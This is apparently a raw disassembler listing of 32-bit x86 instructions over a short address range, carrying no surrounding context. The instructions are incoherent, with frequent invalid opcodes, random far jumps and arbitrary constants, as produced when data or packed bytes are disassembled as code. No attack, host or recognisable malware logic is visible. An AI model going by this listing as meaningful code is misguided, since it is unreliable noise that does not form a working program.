  41b292:	dec    edi
  41b293:	retf   0x30d
  41b296:	nop
  41b297:	mov    esi,DWORD PTR [ebp+eiz*4-0x7b]
  41b29b:	adc    esp,DWORD PTR [ebx]
  41b29d:	mov    ds:0xb80caa72,eax
  41b2a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b2a3:	cld    
  41b2a4:	test   BYTE PTR [edx+0x61],cl
  41b2a7:	inc    ebp
  41b2a8:	dec    edi
  41b2a9:	sub    edx,DWORD PTR [eax+0xf]
  41b2ac:	data16 mov ds,WORD PTR [ebx-0x63]
  41b2b0:	xchg   DWORD PTR [eax-0x13],ebx
  41b2b3:	les    ecx,FWORD PTR [ebp+0x4cf603de]
  41b2b9:	mov    edx,0x65dd2b14
  41b2be:	sub    eax,0x406b42c3
  41b2c3:	add    ebx,DWORD PTR [edi+esi*1]
  41b2c6:	arpl   WORD PTR [esi-0x64],si
  41b2c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b2ca:	(bad)  
  41b2cb:	stc    
  41b2cc:	jmp    0x97dcbe2f
  41b2d1:	int3   
  41b2d2:	loop   0x41b2de
  41b2d4:	sbb    BYTE PTR [ebx+0x78],al
  41b2d7:	sub    edi,DWORD PTR [ebx+0x79d75c78]
  41b2dd:	(bad)  
  41b2de:	jo     0x41b2f6
  41b2e0:	in     eax,0xa6
  41b2e2:	add    al,0xf5
  41b2e4:	out    0x45,eax
  41b2e6:	inc    eax
  41b2e7:	mov    dl,0x1
  41b2e9:	je     0x41b27d
  41b2eb:	adc    eax,DWORD PTR [ebx+ecx*1-0x47e2ddbc]
  41b2f2:	cmp    ch,BYTE PTR [esi+0x7]
  41b2f5:	pop    ss
  41b2f6:	xchg   esi,eax
  41b2f7:	aaa    
  41b2f8:	call   0x7c44:0x83d5c93e
  41b2ff:	adc    BYTE PTR [edi-0x12],dl
  41b302:	mov    al,0xa7
  41b304:	mov    esp,0xfcde583f
  41b309:	or     DWORD PTR [edx],ebp
  41b30b:	sub    al,0x56
  41b30d:	sub    al,0x6f
  41b30f:	cmc    
  41b310:	add    BYTE PTR [ecx-0x1f],dl
  41b313:	sbb    eax,0x8576f5e0
  41b318:	inc    ebx
  41b319:	xlat   BYTE PTR ds:[ebx]
  41b31a:	cmp    eax,esp
  41b31c:	pusha  
  41b31d:	shl    BYTE PTR [ebp-0x72],cl
  41b320:	jns    0x41b2b6
  41b322:	sar    DWORD PTR [ebx],0xd0
  41b325:	ins    DWORD PTR es:[edi],dx
  41b326:	jmp    0x2286:0x7f00d1fd
  41b32d:	mov    ebp,esp
  41b32f:	xchg   ecx,eax
  41b330:	push   ebp
  41b331:	push   ecx
  41b332:	rcr    BYTE PTR [ecx],1
  41b334:	int3   
  41b335:	push   0x5a37aa0e
  41b33a:	mov    ds:0x9675c7ce,eax
  41b33f:	add    DWORD PTR [ebx],esi
  41b341:	push   ss
  41b342:	shl    BYTE PTR [edi],1
  41b344:	ss sbb eax,0x293f5545
  41b34a:	xor    ebp,DWORD PTR ds:0xbee4ae38
  41b350:	sar    BYTE PTR [edx+0x2f2e19d1],1
  41b356:	orps   xmm7,xmm5
  41b359:	jecxz  0x41b320
  41b35b:	sbb    DWORD PTR [ebx+ebp*8+0x4d722577],esi
  41b362:	(bad)  
  41b363:	div    DWORD PTR [ecx+0x6f294797]
  41b369:	sub    al,0x30
  41b36b:	jns    0x41b331
  41b36d:	ins    DWORD PTR es:[edi],dx
  41b36e:	(bad)  
  41b36f:	cmp    eax,0xa274b62b
  41b374:	push   0xffffff9f
  41b376:	mov    bh,al
  41b378:	cmp    BYTE PTR [ebp+edi*8-0x2e],bl
  41b37c:	mov    eax,0x97a54831
  41b381:	bound  edx,QWORD PTR ds:0x36818f9
  41b387:	ss jp  0x41b3b8
  41b38a:	xor    al,0x81
  41b38c:	addr16 in eax,dx
  41b38e:	push   esi
  41b38f:	cmp    al,0x88
  41b391:	dec    esp
  41b392:	jmp    0x367f5eee
  41b397:	mov    ebx,0xab961f5
  41b39c:	and    BYTE PTR [edi+0x463f8923],0x8b
  41b3a3:	(bad)  
  41b3a4:	mov    ds:0xe0cbcee3,eax
  41b3a9:	push   ebp
  41b3aa:	stos   BYTE PTR es:[edi],al
  41b3ab:	pusha  
  41b3ac:	mov    cl,0x17
  41b3ae:	call   0x1329:0x512ac43a
  41b3b5:	data16 or al,0x2f
  41b3b8:	mov    esi,0xc9dc97ce
  41b3bd:	pop    esi
  41b3be:	call   0x22:0x3442fa16
  41b3c5:	add    cl,BYTE PTR [ecx+0x160a2a39]
  41b3cb:	sub    BYTE PTR [ecx-0x10],bh
  41b3ce:	(bad)  
  41b3d0:	ret    0xb1a7
  41b3d3:	adc    esp,DWORD PTR [edx-0x1fef0222]
  41b3d9:	jp     0x41b37d
  41b3db:	mov    ds,WORD PTR [eax+0x7af916a2]
  41b3e1:	shr    edi,1
  41b3e3:	ds xchg edi,eax
  41b3e5:	paddusb mm5,QWORD PTR [edx]
  41b3e8:	les    edi,FWORD PTR [ebp-0x5d]
  41b3eb:	retf   
  41b3ec:	and    al,cl
  41b3ee:	jbe    0x41b3da
  41b3f0:	ret    0x1bb
  41b3f3:	jg     0x41b3ad
  41b3f5:	call   0x79c9:0x558d745d
  41b3fc:	push   ss
  41b3fd:	rol    BYTE PTR [ebx+ebx*8+0x5c],0xc
  41b402:	(bad)  
  41b404:	rcl    BYTE PTR [edx+0x67],1
  41b407:	xor    al,0x5f
  41b409:	cs icebp 
  41b40b:	mov    edx,0xca90a3fc
  41b410:	mov    bl,0xd3
  41b412:	dec    edx
  41b413:	adc    eax,0x97051753
  41b418:	xor    bl,BYTE PTR [edx+0x3528d0af]
  41b41e:	mul    BYTE PTR [edx-0x53c91ee8]
  41b424:	inc    edi
  41b425:	daa    
  41b426:	xchg   esp,eax
  41b427:	call   DWORD PTR [edi+0x14aed88b]
  41b42d:	or     bl,cl
  41b42f:	adc    al,BYTE PTR [ebp-0x1e2699ac]
  41b435:	dec    eax
  41b436:	push   ebx
  41b437:	jo     0x41b48f
  41b439:	sbb    ch,bl
  41b43b:	xchg   ebp,eax
  41b43c:	xchg   esi,eax
  41b43d:	push   esp
  41b43e:	mov    ebx,0xd1556b53
  41b443:	mov    ah,0xbb
  41b445:	mov    DWORD PTR [ebx],edx
  41b447:	(bad)  
  41b448:	loopne 0x41b46e
  41b44a:	ficom  WORD PTR [ebx]
  41b44c:	inc    edi
  41b44d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b44e:	dec    BYTE PTR [ebx+0x1e]
  41b451:	jl     0x41b42d
  41b453:	sahf   
  41b454:	pop    ds
  41b455:	mov    ebx,DWORD PTR [edi]
  41b457:	xor    ah,BYTE PTR [eax+eax*8]
  41b45a:	jge    0x41b3f8
  41b45c:	neg    ah
  41b45e:	leave  
  41b45f:	pop    edx
  41b460:	ret    
  41b461:	(bad)  
  41b462:	adc    al,0x59
  41b464:	aaa    
  41b465:	sub    edi,edx
  41b467:	xchg   ebp,eax
  41b468:	add    BYTE PTR [eax+0x1e856e7d],cl
  41b46e:	xchg   ebp,edx
  41b470:	push   0xadb6b9fb
  41b475:	xor    al,0x88
  41b477:	sub    dl,al
  41b479:	mov    ebx,0xd2632817
  41b47e:	dec    ebx
  41b47f:	cmp    ch,0xe6
  41b482:	gs iret 
  41b484:	pop    ebp
  41b485:	sar    BYTE PTR [eax-0xd9f4f5a],1
  41b48b:	es push ebx
  41b48d:	out    dx,eax
  41b48e:	out    dx,al
  41b48f:	scas   eax,DWORD PTR es:[edi]
  41b490:	and    ebp,esi
  41b492:	lds    esp,FWORD PTR [edi+0x28]
  41b495:	sub    ebx,ebx
  41b497:	pushf  
  41b498:	fisub  WORD PTR [edi+0x4aafbad3]
  41b49e:	xchg   esp,eax
  41b49f:	fcomp  QWORD PTR [ebp+0x5811a409]
  41b4a5:	stos   BYTE PTR es:[edi],al
  41b4a6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4a7:	(bad)  
  41b4a8:	cmp    eax,0x60747b16
  41b4ad:	in     eax,dx
  41b4ae:	jmp    0xe90e:0xf3a04359
  41b4b5:	fdiv   QWORD PTR [eax+0x4a773c6a]
  41b4bb:	loopne 0x41b504
  41b4bd:	mov    ecx,DWORD PTR [eax+0x52]
  41b4c0:	sub    BYTE PTR [ecx],dh
  41b4c2:	mov    ds:0xe703352f,al
  41b4c7:	mov    cl,0x1d
  41b4c9:	mov    ebp,0x82ea322e
  41b4ce:	mov    dl,0xbd
  41b4d0:	or     dl,BYTE PTR [ebx]
  41b4d2:	jno    0x41b52b
  41b4d4:	loop   0x41b517
  41b4d6:	mov    esp,0xa0613b3a
  41b4db:	repnz adc BYTE PTR [edi-0x7d5e7a24],dl
  41b4e2:	xchg   esi,eax
  41b4e3:	cwde   
  41b4e4:	xchg   edx,eax
  41b4e5:	jmp    0x41b4af
  41b4e7:	push   ds
  41b4e8:	stc    
  41b4e9:	shr    DWORD PTR [ebx+0x3d8abde3],0xc0
  41b4f0:	sar    BYTE PTR [ecx-0x619e2548],0x6b
  41b4f7:	stos   DWORD PTR es:[edi],eax
  41b4f8:	or     DWORD PTR [ecx-0x6],0x7ed30613
  41b4ff:	xchg   esp,eax
  41b500:	jo     0x41b55f
  41b502:	int    0xd5
  41b504:	or     BYTE PTR [edx-0x67dec440],al
  41b50a:	das    
  41b50b:	aad    0xa5
  41b50d:	jne    0x41b568
  41b50f:	adc    cl,bl
  41b511:	ror    BYTE PTR [ecx+0xfccae35],0xed
  41b518:	test   DWORD PTR [ecx+0x20d4241e],edx
  41b51e:	stc    
  41b51f:	pop    esp
  41b520:	xor    al,0xc5
  41b522:	daa    
  41b523:	test   DWORD PTR [ebx-0x3f53dd59],ebp
  41b529:	jb     0x41b58b
  41b52b:	cdq    
  41b52c:	das    
  41b52d:	neg    BYTE PTR [edi+0x62f194b9]
  41b533:	into   
  41b534:	leave  
  41b535:	iret   
  41b536:	out    0x91,al
  41b538:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b539:	push   ebp
  41b53a:	jmp    0xf67d1ead
  41b53f:	xor    cl,BYTE PTR gs:[ebx+0x7b241a3b]
  41b546:	adc    ebp,eax
  41b548:	mov    dh,0x88
  41b54a:	fdiv   st(4),st
  41b54c:	jle    0x41b523
  41b54e:	aas    
  41b54f:	iret   
  41b550:	(bad)  
  41b551:	sbb    dh,cl
  41b553:	mov    cl,0x64
  41b555:	jecxz  0x41b5a5
  41b557:	mov    esi,0x5fbe6506
  41b55c:	retf   
  41b55d:	pop    esp
  41b55e:	sub    cl,0x8
  41b561:	add    eax,0xfb53c41a
  41b566:	push   esp
  41b567:	jmp    0x27a:0xcf14f06f
  41b56e:	fs lahf 
  41b570:	or     ebx,esp
  41b572:	xor    eax,0x53de12ad
  41b577:	ins    DWORD PTR es:[edi],dx
  41b578:	das    
  41b579:	imul   BYTE PTR [esi+edx*2-0x350a0b57]
  41b580:	adc    al,0xf7
  41b582:	mov    bh,0xc1
  41b584:	sbb    eax,0x117cb8f9
  41b589:	shl    BYTE PTR [ebp+0x66e59b6a],cl
  41b58f:	outs   dx,BYTE PTR ds:[esi]
  41b590:	cmp    eax,0x52c5fdee
  41b595:	fcomp  DWORD PTR [edi-0x2651bbe8]
  41b59b:	lods   eax,DWORD PTR ds:[esi]
  41b59c:	mov    ecx,0x181e8a7e
  41b5a1:	xor    bh,BYTE PTR [eax]
  41b5a3:	enter  0xfdf1,0xfa
  41b5a7:	fisttp WORD PTR [ebp+ebp*2+0x74]
  41b5ab:	sub    eax,0x567bf836
  41b5b0:	test   DWORD PTR [esi-0x7],esi
  41b5b3:	cdq    
  41b5b4:	scas   al,BYTE PTR es:[edi]
  41b5b5:	inc    ebx
  41b5b6:	jle    0x41b60c
  41b5b8:	mov    ecx,0xb3552494
  41b5bd:	inc    ecx
  41b5be:	or     DWORD PTR [eax+0x6b61dae5],0x334ac088
  41b5c8:	mov    cl,0x93
  41b5ca:	adc    al,0x4f
  41b5cc:	xchg   esp,eax
  41b5cd:	jg     0x41b63f
  41b5cf:	pop    edx
  41b5d0:	loopne 0x41b5a5
  41b5d2:	push   edx
  41b5d3:	xchg   BYTE PTR [ebx+0x4d06234a],bh
  41b5d9:	cmp    BYTE PTR cs:[ebp-0x7ea77355],dl
  41b5e0:	(bad)  
  41b5e1:	hlt    
  41b5e2:	retf   0xcea
  41b5e5:	xchg   edx,eax
  41b5e6:	mov    al,0xdb
  41b5e8:	test   BYTE PTR [edx-0x5e],ah
  41b5eb:	outs   dx,BYTE PTR ds:[esi]
  41b5ec:	ret    
  41b5ed:	push   esi
  41b5ee:	jmp    DWORD PTR [ebx+0x1c]
  41b5f1:	aaa    
  41b5f2:	js     0x41b59c
  41b5f4:	xchg   esi,eax
  41b5f5:	add    BYTE PTR [ebx+0x4ab6e3a7],dl
  41b5fb:	mov    cl,0xfa
  41b5fd:	ss ret 
  41b5ff:	mov    ds:0x1c37cef2,eax
  41b604:	mov    bl,0x4f
  41b606:	xor    BYTE PTR [edx],bl
  41b608:	xor    al,0xc8
  41b60a:	jmp    0x41b67c
  41b60c:	inc    edx
  41b60d:	cli    
  41b60e:	mov    cl,BYTE PTR [eax-0x4ffa164d]
  41b614:	sti    
  41b615:	sub    eax,DWORD PTR [ebx-0x93b0ede]
  41b61b:	pop    edi
  41b61c:	mov    edx,0x6a321f30
  41b621:	dec    ebp
  41b622:	xchg   ebp,eax
  41b623:	sbb    al,0x68
  41b625:	stos   BYTE PTR es:[edi],al
  41b626:	fldcw  WORD PTR [ecx-0x1a]
  41b629:	shl    DWORD PTR [edi-0x74],cl
  41b62c:	sub    cl,BYTE PTR [ecx]
  41b62e:	sar    esp,0x96
  41b631:	shl    BYTE PTR [edi],cl
  41b633:	test   DWORD PTR [ecx],esi
  41b635:	idiv   ah
  41b637:	sub    BYTE PTR [ecx+0x34],ch
  41b63a:	sub    eax,0x4fefe54a
  41b63f:	inc    edi
  41b640:	sahf   
  41b641:	add    BYTE PTR [esi+0x1aacf32e],dl
  41b647:	dec    esi
  41b648:	pop    edx
  41b649:	in     al,dx
  41b64a:	jp     0x41b610
  41b64c:	sub    BYTE PTR [ebx-0x40],bl
  41b64f:	rcl    DWORD PTR [edx],1
  41b651:	add    edx,DWORD PTR [ebp-0x43a8d2a9]
  41b657:	dec    edi
  41b658:	loop   0x41b644
  41b65a:	test   DWORD PTR [edi-0x7e],ebx
  41b65d:	mov    esp,DWORD PTR [ebx+0x5b8da23b]
  41b663:	jns    0x41b634
  41b665:	test   al,0x93
  41b667:	pop    ds
  41b668:	(bad)  
  41b669:	mov    ch,0x63
  41b66b:	pop    esi
  41b66c:	jne    0x41b643
  41b66e:	hlt    
  41b66f:	rcr    DWORD PTR [ebx+0x4e],0x54
  41b673:	ret    
  41b674:	pop    edx
  41b675:	inc    DWORD PTR [esi-0x5e1b0976]
  41b67b:	in     al,dx
  41b67c:	mov    ebx,0x86a2aeca
  41b681:	inc    ecx
  41b682:	stos   DWORD PTR es:[edi],eax
  41b683:	retf   
  41b684:	add    al,0x12
  41b686:	and    eax,0x45f20575
  41b68b:	out    dx,al
  41b68c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b68d:	in     eax,0x58
  41b68f:	in     al,dx
  41b690:	pop    edi
  41b691:	or     BYTE PTR [ebp-0x7a],al
  41b694:	fisubr DWORD PTR [eax]
  41b696:	inc    edx
  41b697:	xchg   BYTE PTR [edi],ah
  41b699:	adc    dh,BYTE PTR [edi+edx*8+0x6dfa6b07]
  41b6a0:	pop    esp
  41b6a1:	or     DWORD PTR [ebx],edx
  41b6a3:	push   ebp
  41b6a4:	and    DWORD PTR [edx-0x7b503284],ecx
  41b6aa:	jp     0x41b6ca
  41b6ac:	xchg   ebx,esp
  41b6ae:	xor    dl,ah
  41b6b0:	es mov edi,0xd1b1d3cc
  41b6b6:	mul    BYTE PTR [ebx]
  41b6b8:	jmp    0x5ac6:0x809be201
  41b6bf:	jb     0x41b67e
  41b6c1:	mov    ch,0x25
  41b6c3:	in     eax,0x5d
  41b6c5:	xchg   edi,eax
  41b6c6:	(bad)  
  41b6c7:	test   al,0x45
  41b6c9:	(bad)  
  41b6ca:	jb     0x41b706
  41b6cc:	xlat   BYTE PTR ds:[bx]
  41b6ce:	shl    BYTE PTR [ecx-0x2ffcc3a1],cl
  41b6d4:	lods   al,BYTE PTR ds:[esi]
  41b6d5:	retf   
  41b6d6:	repnz xor DWORD PTR [edi+esi*4-0x90a56a7],edx
  41b6de:	add    cl,dl
  41b6e0:	(bad)  [esi+ebp*8+0x5cf88e2a]
  41b6e7:	fsubr  st,st(5)
  41b6e9:	in     eax,0x5d
  41b6eb:	jmp    0x5752:0x4d675395
  41b6f2:	xchg   BYTE PTR [ecx-0x3a],ch
  41b6f5:	push   ecx
  41b6f6:	std    
  41b6f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6f8:	sbb    al,0x8c
  41b6fa:	dec    esi
  41b6fb:	out    0xf9,al
  41b6fd:	(bad)  
  41b6fe:	enter  0xfac6,0x0
  41b702:	push   ebp
  41b703:	jl     0x41b6f4
  41b705:	xchg   edi,eax
  41b706:	jle    0x41b6a6
  41b708:	jg     0x41b710
  41b70a:	mov    dl,0x35
  41b70c:	inc    esp
  41b70d:	add    eax,0x17586aa3
  41b712:	(bad)  
  41b713:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b714:	cdq    
  41b715:	xchg   DWORD PTR [edx+0x14142a98],ebx
  41b71b:	push   es
  41b71c:	enter  0x3870,0x6
  41b720:	pop    es
  41b721:	xchg   ebx,eax
  41b722:	pop    ds
  41b723:	(bad)  
  41b724:	adc    eax,0x7046f552
  41b729:	xor    DWORD PTR [esi],eax
  41b72b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b72c:	jb     0x41b799
  41b72e:	ins    BYTE PTR es:[edi],dx
  41b72f:	out    0x61,al
  41b731:	aam    0x4f
  41b733:	ret    0x6635
  41b736:	lea    ebx,[edi-0x49]
  41b739:	xchg   BYTE PTR [esi-0x2b],bl
  41b73c:	lock mov es,esp
  41b73f:	scas   al,BYTE PTR es:[edi]
  41b740:	pop    esp
  41b741:	add    dl,cl
  41b743:	repnz add DWORD PTR [esi],0x511e4f41
  41b74a:	lods   al,BYTE PTR ds:[esi]
  41b74b:	rcr    DWORD PTR [eax-0x51],cl
  41b74e:	(bad)  
  41b74f:	aam    0x26
  41b751:	sub    edi,edx
  41b753:	aaa    
  41b754:	in     eax,dx
  41b755:	out    0xe,eax
  41b757:	sti    
  41b758:	inc    edi
  41b759:	pop    ebx
  41b75a:	inc    esp
  41b75b:	pop    edx
  41b75c:	ret    0xc62f
  41b75f:	push   cs
  41b760:	je     0x41b792
  41b762:	dec    edi
  41b763:	fs inc ebx
  41b765:	cs enter 0x902f,0x5a
  41b76a:	push   es
  41b76b:	xlat   BYTE PTR ds:[ebx]
  41b76c:	out    0x31,al
  41b76e:	(bad)  
  41b76f:	and    eax,DWORD PTR [ecx-0x4f]
  41b772:	sbb    ah,ah
  41b774:	(bad)  
  41b775:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b776:	ror    DWORD PTR [esi],cl
  41b778:	xchg   DWORD PTR [esi+ebp*4+0x1a4da993],ebx
  41b77f:	les    ecx,FWORD PTR [esi-0x6c465a40]
  41b785:	xchg   DWORD PTR [ebp-0xc],esi
  41b788:	adc    al,0xc5
  41b78a:	add    DWORD PTR [ecx],edi
  41b78c:	adc    BYTE PTR [ebp-0x2b221c6f],bh
  41b792:	pop    edi
  41b793:	call   0xdf111bd2
  41b798:	rcl    BYTE PTR [ecx],cl
  41b79a:	mov    al,ds:0x5dd99133
  41b79f:	enter  0x972b,0x64
  41b7a3:	sbb    esp,DWORD PTR [edi]
  41b7a5:	outs   dx,BYTE PTR ds:[esi]
  41b7a6:	inc    esi
  41b7a7:	repnz dec ebp
  41b7a9:	loopne 0x41b781
  41b7ab:	data16 xchg al,dh
  41b7ae:	sub    eax,0xb16b9856
  41b7b3:	pusha  
  41b7b4:	cmp    al,0xe6
  41b7b6:	aaa    
  41b7b7:	les    eax,FWORD PTR [esi]
  41b7b9:	adc    BYTE PTR [ebp+0x27db6eca],bh
  41b7bf:	lock mov esp,0x46c149a0
  41b7c5:	ss cmp al,0xbf
  41b7c8:	inc    ecx
  41b7c9:	(bad)  
  41b7ca:	imul   edi,DWORD PTR [edx+eiz*2-0x14],0xb6a5d9e5
  41b7d2:	cwde   
  41b7d3:	daa    
  41b7d4:	push   edx
  41b7d5:	bound  eax,QWORD PTR [edx+0x2b2e19fb]
  41b7db:	aad    0x63
  41b7dd:	jnp    0x41b853
  41b7df:	sahf   
  41b7e0:	iret   
  41b7e1:	(bad)  
  41b7e2:	js     0x41b85f
  41b7e4:	sbb    DWORD PTR [edi],edx
  41b7e6:	jg     0x41b771
  41b7e8:	xchg   esp,eax
  41b7e9:	test   eax,0x6a110ed5
  41b7ee:	push   edi
  41b7ef:	out    0x1b,eax
  41b7f1:	or     eax,0xf160e450
  41b7f6:	sbb    edi,eax
  41b7f8:	mov    edx,0x5ee7e1e3
  41b7fd:	mov    cl,0xde
  41b7ff:	add    esp,edx
  41b801:	dec    esi
  41b802:	dec    ebp
  41b803:	fsub   QWORD PTR [ecx+0x101c7f82]
  41b809:	fistp  DWORD PTR [esi-0x15]
  41b80c:	and    eax,0xdd81573b
  41b811:	pusha  
  41b812:	jmp    0x41b839
  41b814:	sbb    bl,0xac
  41b817:	imul   ebp,DWORD PTR [edi-0x6f3b60fe],0xc23b1388
  41b821:	int    0x3b
  41b823:	pop    esi
  41b824:	addr16 rcr dh,0x15
  41b828:	repz adc eax,0xd5a1d2d3
  41b82e:	fwait
  41b82f:	mov    DWORD PTR [ecx-0x23],ebp
  41b832:	jecxz  0x41b7c2
  41b834:	jmp    0x4f1ba92d
  41b839:	mov    esi,0xfa88c8fc
  41b83e:	jne    0x41b850
  41b840:	fisttp WORD PTR [eax]
  41b842:	repnz (bad) 
  41b844:	inc    BYTE PTR [ebx-0x1]
  41b847:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b848:	mov    BYTE PTR [ebx-0x470a9f97],dl
  41b84e:	imul   esi,DWORD PTR [ecx-0x4e],0xe4347d63
  41b855:	cld    
  41b856:	leave  
  41b857:	push   ecx
  41b858:	scas   al,BYTE PTR es:[edi]
  41b859:	bound  ebp,QWORD PTR [eax+0x7349f66]
  41b85f:	mov    DWORD PTR [ebp+edi*1-0x5e8f6cf2],ebp
  41b866:	push   edi
  41b867:	int    0x62
  41b869:	out    0xf4,al
  41b86b:	jae    0x41b88f
  41b86d:	xor    BYTE PTR [ebx+0x16053055],ch
  41b873:	pop    esp
  41b874:	cmp    DWORD PTR [ebp-0x7b],ebp
  41b877:	inc    esp
  41b878:	jne    0x41b86a
  41b87a:	out    dx,eax
  41b87b:	shl    BYTE PTR [edx],cl
  41b87d:	add    eax,0x18afbea3
  41b882:	(bad)  
  41b883:	or     al,0x44
  41b885:	repnz dec eax
  41b887:	mov    ah,0x4b
  41b889:	aas    
  41b88a:	inc    edx
  41b88b:	test   BYTE PTR [edi+ebp*1+0x4c2ba3d8],dh
  41b892:	cmc    
  41b893:	pop    ebx
  41b894:	fimul  DWORD PTR [edi-0x2d192fda]
  41b89a:	and    ecx,DWORD PTR [eax*4+0x13f89a0f]
  41b8a1:	mov    ecx,0xe56658e
  41b8a6:	push   ss
  41b8a7:	and    al,0xb1
  41b8a9:	leave  
  41b8aa:	retf   
  41b8ab:	out    0x25,al
  41b8ad:	in     eax,0x49
  41b8af:	inc    BYTE PTR [eax+0x2d]
  41b8b2:	aaa    
  41b8b3:	std    
  41b8b4:	or     DWORD PTR [esp+eiz*4-0x6d],0x4d
  41b8b9:	into   
  41b8ba:	add    al,0x7b
  41b8bc:	out    0x1c,al
  41b8be:	out    0x56,eax
  41b8c0:	ret    
  41b8c1:	push   eax
  41b8c2:	jne    0x41b856
  41b8c4:	inc    esp
  41b8c5:	das    
  41b8c6:	or     eax,edi
  41b8c8:	inc    ecx
  41b8c9:	or     DWORD PTR [ebp-0x5f],eax
  41b8cc:	fisttp WORD PTR [esi+0x11]
  41b8cf:	jae    0x41b8c3
  41b8d1:	push   edi
  41b8d2:	jmp    0x41b91c
  41b8d4:	add    al,0x4e
  41b8d6:	test   eax,0xf8348605
  41b8db:	ds push eax
  41b8dd:	cmp    bh,bl
  41b8df:	(bad)  
  41b8e0:	call   0xc5c5:0xf04491a9
  41b8e7:	mov    esp,0xd5e50c22
  41b8ec:	repnz aad 0xa8
  41b8ef:	pusha  
  41b8f0:	cmc    
  41b8f1:	aaa    
  41b8f2:	or     DWORD PTR [esp+ebp*2-0x1f],eax
  41b8f6:	imul   ch
  41b8f8:	je     0x41b8f2
  41b8fa:	cmp    edi,DWORD PTR [eax-0x30904a98]
  41b900:	arpl   WORD PTR [ebx-0x6a],cx
  41b903:	test   al,0x7
  41b905:	inc    edx
  41b906:	shr    edi,0xff
  41b909:	mov    BYTE PTR [edx+0x15],al
  41b90c:	lahf   
  41b90d:	jg     0x41b8f9
  41b90f:	mov    ecx,0x4f136d7
  41b914:	xchg   ecx,eax
  41b915:	outs   dx,DWORD PTR ds:[esi]
  41b916:	inc    ecx
  41b917:	mov    dl,0x2
  41b919:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b91a:	cmp    bl,BYTE PTR [eax]
  41b91c:	retf   
  41b91d:	sbb    eax,0xa4ea9ca7
  41b922:	inc    edx
  41b923:	push   ss
  41b924:	cld    
  41b925:	pop    esp
  41b926:	sbb    edx,ebp
  41b928:	cmp    eax,0xae09cd2d
  41b92d:	ja     0x41b914
  41b92f:	shl    DWORD PTR [ebx-0x7e717cbc],1
  41b935:	sub    BYTE PTR [edi],dh
  41b937:	iret   
  41b938:	popf   
  41b939:	je     0x41b8fe
  41b93b:	(bad)  
  41b93c:	sub    eax,DWORD PTR [ecx+edx*4+0x18]
  41b940:	pop    edx
  41b941:	inc    eax
  41b942:	mov    ah,0x15
  41b944:	and    ch,BYTE PTR [ebx+ebp*8-0x60a32eb0]
  41b94b:	mov    ebx,0x1311ea0b
  41b950:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b951:	push   esp
  41b952:	(bad)  
  41b953:	mov    al,ds:0x336b5139
  41b958:	jmp    0x41b98e
  41b95a:	fnsave [esi]
  41b95c:	mov    ds:0xe7927fe8,al
  41b961:	mov    dh,0x55
  41b963:	test   al,0x58
  41b965:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b966:	dec    bp
  41b968:	push   cs
  41b969:	or     eax,DWORD PTR [esi+0x161864]
  41b96f:	sub    dl,BYTE PTR [esi-0x6e522dec]
  41b975:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b976:	sub    al,0x94
  41b978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b979:	xor    BYTE PTR [edx],dh
  41b97b:	int3   
  41b97c:	cmp    eax,0x954fa12e
  41b981:	pop    ss
  41b982:	mov    esp,ebx
  41b984:	sbb    eax,0xe260a671
  41b989:	loope  0x41b981
  41b98b:	js     0x41b9b5
  41b98d:	xchg   bh,bh
  41b98f:	jmp    FWORD PTR ds:0x1b5d62de
  41b995:	aam    0x35
  41b997:	mov    cl,0xdc
  41b999:	lods   eax,DWORD PTR ds:[esi]
  41b99a:	rcl    BYTE PTR [ebx-0x20c88f2f],1
  41b9a0:	mov    al,0xb9
  41b9a2:	mov    dl,BYTE PTR [eax-0x2017e40f]
  41b9a8:	lock xor al,0x55
  41b9ab:	pop    ebp
  41b9ac:	repz sub DWORD PTR [ebp+0xd],ebp
  41b9b0:	mov    eax,ds:0x408a4f2e
  41b9b5:	in     eax,0xc4
  41b9b7:	imul   ebx,DWORD PTR [ecx],0x11
  41b9ba:	jae    0x41b988
  41b9bc:	xor    bh,BYTE PTR [ebp-0x6444cd3f]
  41b9c2:	(bad)  
  41b9c4:	sub    al,0xe0
  41b9c6:	arpl   WORD PTR ds:0x896b2149,di
  41b9cc:	dec    ebp
  41b9cd:	xor    eax,0xe37534d0
  41b9d2:	test   DWORD PTR [ecx+0x7f],edi
  41b9d5:	aaa    
  41b9d6:	pop    ebx
  41b9d7:	movups xmm0,XMMWORD PTR [edx+0x3e]
  41b9db:	jbe    0x41b9b1
  41b9dd:	xor    bl,dl
  41b9df:	cli    
  41b9e0:	inc    eax
  41b9e1:	punpcklbw mm5,DWORD PTR [ecx]
  41b9e4:	loope  0x41b974
  41b9e6:	loopne 0x41ba53
  41b9e8:	jmp    0xfdf423c3
  41b9ed:	push   ss
  41b9ee:	fnsave ds:0x70b4787f
  41b9f4:	pop    ds
  41b9f5:	pop    esi
  41b9f6:	frstor [edx-0x7c]
  41b9f9:	and    esp,esi
  41b9fb:	int    0xef
  41b9fd:	lods   eax,DWORD PTR ds:[esi]
  41b9fe:	out    0x95,al
  41ba00:	mov    ecx,0xbf6195b2
  41ba05:	mov    ?,WORD PTR [ebx+0x1a]
  41ba08:	mov    ebx,0xc5dfff74
  41ba0d:	gs call 0x27b44743
  41ba13:	loopne 0x41ba23
  41ba15:	pushf  
  41ba16:	xchg   ebp,eax
  41ba17:	push   cs
  41ba18:	popf   
  41ba19:	sbb    ebp,ecx
  41ba1b:	add    BYTE PTR [edi+0x51834ee6],ch
  41ba21:	(bad)  
  41ba22:	dec    eax
  41ba23:	fwait
  41ba24:	adc    eax,0xd006b92d
  41ba29:	push   edi
  41ba2a:	rcl    bl,cl
  41ba2c:	inc    esp
  41ba2d:	inc    ebp
